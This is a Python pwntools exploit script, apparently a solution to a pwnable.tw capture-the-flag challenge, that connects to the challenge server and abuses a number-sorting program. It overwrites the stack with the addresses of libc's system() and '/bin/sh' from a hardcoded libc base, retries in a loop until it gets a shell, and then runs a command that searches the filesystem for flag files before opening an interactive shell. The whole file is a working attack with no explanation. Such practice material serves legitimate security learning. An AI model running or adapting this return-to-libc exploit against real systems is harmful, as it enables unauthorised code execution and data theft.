from pwn import *
while(True):
	libc=ELF('./libc32')
	target=remote('chall.pwnable.tw',10101)

	def sla(string,val):
		target.sendlineafter(string,val)
	def sa(string,val):
		target.sendafter(string,val)
		
	def init(name,n):
		sa("name :",name)
		sla("sort :",str(n))
		
	def attack(val):
		sla("number : ",val)

	libc_base=0xf753a000
	print("libc_base= "+hex(libc_base))
	libc_system=libc_base+libc.symbols["system"]
	libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
	try:
		init("A",44)
		for i in range(8):
			attack(str(libc_system))
		attack(str(libc_binsh))
		for i in range(15):
			attack(str(0))
		attack("A")
		
		target.recvuntil("Result :\n")
		order=[0]*44
		for i in range(44):
			order[i]=int(target.recvuntil(" ").strip(" "))
		for i in range(44):
			print(str(i)+"= "),
			print(hex(order[i]))
	except:
		target.close()
		continue
	r2=""
	try:
		target.sendline('echo win;cat `find / -name "*flag*"`')
		r2=target.recv()
		print(r2)
	except:
		target.close()
		continue
	if("win" in r2):
		target.interactive()
	else:
		target.close()
		continue
